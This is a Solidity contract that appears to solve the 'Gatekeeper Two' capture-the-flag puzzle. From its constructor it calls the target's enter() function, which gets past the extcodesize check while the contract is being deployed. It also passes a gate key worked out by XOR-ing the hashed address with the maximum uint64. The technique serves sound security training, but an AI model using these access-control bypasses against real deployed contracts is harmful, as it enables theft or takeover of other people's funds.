// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
  IGatekeeperTwo victimContract;

  event Debug(string _hexstr);

  constructor(address _targetAddress) {
    victimContract = IGatekeeperTwo(_targetAddress);

    unchecked {
      uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
      uint64 c = uint64(0) - 1;

      emit Debug(toHexString(a));
      emit Debug(toHexString(c));
      emit Debug(toHexString(a ^ c));
      emit Debug(toHexString(a ^ (a ^ c)));
      // When contract is being created, code size (extcodesize) is 0.
      // This will pass the (x == 0) requirement from Gate 2
      victimContract.enter(bytes8(a ^ c)); // A ^ C = B
    }
  }

  // Helper functions to show the results
  function toHexDigit(uint8 d) internal pure returns (bytes1) {
    if (0 <= d && d <= 9) {
      return bytes1(uint8(bytes1('0')) + d);
    } else if (10 <= uint8(d) && uint8(d) <= 15) {
      return bytes1(uint8(bytes1('a')) + d - 10);
    }
    // revert("Invalid hex digit");
    revert();
  }

  function toHexString(uint256 a) internal pure returns (string memory) {
    uint256 count = 0;
    uint256 b = a;
    while (b != 0) {
      count++;
      b /= 16;
    }
    bytes memory res = new bytes(count);
    for (uint256 i = 0; i < count; ++i) {
      b = a % 16;
      res[count - i - 1] = toHexDigit(uint8(b));
      a /= 16;
    }
    return string(res);
  }
}
